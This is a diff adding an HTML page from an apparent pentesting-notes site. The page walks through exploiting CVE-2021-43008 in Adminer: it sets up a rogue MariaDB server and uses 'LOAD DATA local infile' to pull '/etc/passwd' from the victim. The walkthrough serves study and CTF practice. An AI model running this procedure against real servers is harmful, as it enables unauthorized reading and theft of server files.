@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Adminer (TCP/80)</h1>
+            <p>Adminer (formerly known as phpMinAdmin) is a tool for managing content in databases</p>
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>CVE-2021-43008</h3>
+                <ul>
+                <p>Improper Access Control in Adminer versions <= 4.6.2 (fixed in version 4.6.3) allows an attacker to achieve Arbitrary File Read on the server by connecting a remote MySQL database to the Adminer.</p>
+                <p>In order to exploit this vulnerability the attacker needs to be logged in the adminer website where you can manage databases <b>The thing here is that it is likely that you don't have credentials in the victim's database so you can create your own database and connect to it</b></p>
+                <p>To do so follow the steps:</p>
+                <p>Install mariadb and enable the service</p>
+                <pre><code class="language-bash">sudo apt install mariadb-server mariadb-client -y
+sudo systemctl status mariadb
+sudo systemctl enable --now mariadb
+sudo mysql -u root</code></pre>
+                <p>Create database</p>   
+                <pre><code class="language-bash">CREATE DATABASE admirerdb;</code></pre>  
+                <p>Create table</p>
+                <pre><code class="language-bash">CREATE TABLE output (
+data VARCHAR(1024)
+);    </code></pre>  
+                <p>Create user and grant permissions to it</p>
+                <pre><code class="language-bash">CREATE USER 'waldo'@'%' IDENTIFIED BY 'mypassword';
+GRANT ALL PRIVILEGES ON admirerdb.* TO 'waldo'@'%';</code></pre>
+                <p>Apply changes and exit</p>  
+                <pre><code class="language-bash">FLUSH PRIVILEGES;
+EXIT;</code></pre>      
+                <p>Modody the 50-server.conf file to allow external connections and restart the service</p>
+                <pre><code class="language-bash">sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
+bind-address = 0.0.0.0
+sudo systemctl restart mariadb</code></pre>    
+                <p>Now connect to you database and perform the following query in the adminer panel of the victim</p>
+                <pre><code class="language-bash">LOAD DATA local infile '/etc/passwd' into table output</code></pre>
+                <p>Show contents of the table and enjoy</p>                
+</ul>    
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
